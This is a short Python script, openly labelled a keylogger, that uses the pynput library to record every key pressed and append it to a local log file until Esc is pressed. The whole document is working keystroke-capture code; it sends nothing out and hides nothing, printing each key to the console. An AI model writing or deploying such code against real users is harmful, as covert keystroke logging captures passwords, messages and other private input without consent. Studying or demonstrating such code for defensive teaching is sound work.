from pynput.keyboard import Key, Listener

file = "./keylogger-log.txt"

def detectKey(key):
    key = str(key).replace("'", "")
    with open(file, "a") as f:
        if(key != "Key.shift"):
            if(key == "Key.enter"):
                f.write("\n")
            elif (key == "Key.space"):
                f.write(" ")
            elif (key == "Key.tab"):
                f.write("\t")
            else:
                f.write(key)
    print("Key detected {0}".format(key))

def exit(key):
    if key == Key.esc:
        print("Exiting...")
        return False

def main():
    with Listener(on_press=detectKey, on_release=exit) as listener:
        listener.join()

if __name__ == "__main__":
    main()